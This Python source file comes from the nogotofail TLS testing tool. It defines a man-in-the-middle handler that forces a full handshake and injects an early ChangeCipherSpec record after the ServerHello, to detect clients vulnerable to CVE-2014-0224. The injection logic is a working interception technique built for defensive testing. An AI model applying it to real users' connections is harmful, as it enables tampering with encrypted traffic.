r'''
Copyright 2014 Google Inc. All rights reserved.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
'''
import logging
from nogotofail.mitm import util
from nogotofail.mitm.connection.handlers.connection import LoggingHandler
from nogotofail.mitm.connection.handlers.connection import handlers
from nogotofail.mitm.connection.handlers.store import handler
from nogotofail.mitm.util import tls
from nogotofail.mitm.util.tls.types import Alert, Extension, HandshakeMessage, TlsRecord
from nogotofail.mitm.event import connection


@handler(handlers, default=True)
class EarlyCCS(LoggingHandler):

    name = "earlyccs"
    description = "Tests for OpenSSL early CCS vulnerability(CVE-2014-0224)"
    clienthello_handled = False
    injected_server = False
    bridge = False
    buffer = ""

    def on_ssl(self, hello):
        self.ssl = True
        self.client_session_id = hello.session_id
        return False

    def on_request(self, request):
        if not self.ssl or self.bridge:
            return request
        try:
            record, size = TlsRecord.from_stream(request)
            message = record.messages[0]
            if not self.clienthello_handled:
                self.clienthello_handled = True
                hello = message.obj
                # Force a full handshake by preventing session resumption by emptying
                # session ID and SessionTicket extension. Otherwise a CCS will follow
                # a ServerHello normally.
                hello.session_id = []
                for ext in hello.extension_list:
                    if ext.type == Extension.TYPE.SESSIONTICKET:
                        ext.raw_data = []
                return record.to_bytes()
            if self.injected_server:
                # OpenSSL after the EarlyCCS fix should send a fatal alert
                # unexpected_message (10). Some other libraries send a close_notify (0)
                # so we accept that as well. Morever, if the client doesn't like the TLS
                # protocol version chosen by the server (regardless of whether early
                # CCS is injected), the client will send a fatal alert
                # protocol_version (70) or handshake_failure (40).
                if not (
                    isinstance(message, tls.types.Alert) and
                       ((message.description == Alert.DESCRIPTION.UNEXPECTED_MESSAGE and
                           message.level == Alert.LEVEL.FATAL) or
                       (message.description == Alert.DESCRIPTION.PROTOCOL_VERSION and
                           message.level == Alert.LEVEL.FATAL) or
                       (message.description == Alert.DESCRIPTION.HANDSHAKE_FAilURE and
                           message.level == Alert.LEVEL.FATAL) or
                       message.description == Alert.DESCRIPTION.CLOSE_NOTIFY)):
                    self.log(
                        logging.CRITICAL,
                        "Client is vulnerable to Early CCS attack!")
                    self.connection.vuln_notify(util.vuln.VULN_EARLY_CCS)
                    self.log_attack_event()

                    self.connection.close()
                else:
                    self.log(
                        logging.DEBUG,
                        "Client not vulnerable to early CCS")
                    self.log_attack_event(success=False)

        except ValueError:
            # Failed to parse TLS, this is probably due to a short read of a TLS
            # record.
            pass
        return request

    def _inject_ccs(self, record, hello_message_index):
        """Inject an early CCS while preserving the rest of the data."""
        version = record.version

        ccs = TlsRecord(
            TlsRecord.CONTENT_TYPE.CHANGE_CIPHER_SPEC,
            version,
            [tls.types.ChangeCipherSpec(1)])

        rec = TlsRecord(
            TlsRecord.CONTENT_TYPE.HANDSHAKE,
            version,
            record.messages[:hello_message_index + 1])

        # Split the record if there are more messages after the ServerHello.
        remaining = record.messages[hello_message_index + 1:]
        if remaining:
            rest = TlsRecord(
                TlsRecord.CONTENT_TYPE.HANDSHAKE,
                version,
                remaining).to_bytes()
        else:
            rest = ""

        return rec.to_bytes() + ccs.to_bytes() + rest



    def on_response(self, response):
        if not self.ssl or self.bridge or self.injected_server:
            return response
        response = self.buffer + response
        self.buffer = ""
        try:
            index = 0
            while index < len(response):
                record, size = TlsRecord.from_stream(response[index:])
                version = record.version
                for i, message in enumerate(record.messages):
                    # Inject the CCS right after the ServerHello
                    if (isinstance(message, tls.types.HandshakeMessage)
                           and message.type == HandshakeMessage.TYPE.SERVER_HELLO):
                        response = (response[:index] +
                                self._inject_ccs(record, i) +
                                response[index+size:])
                        self.injected_server = True
                        return response

                index += size

        except ValueError:
            # Failed to parse TLS, this is probably due to a short read of a TLS
            # record. Buffer the response to try and get more data.
            self.buffer = response
            # But don't buffer too much, give up after 16k.
            if len(self.buffer) > 2**14:
                response = self.buffer
                self.buffer = ""
                return self.buffer
            return ""
        return response
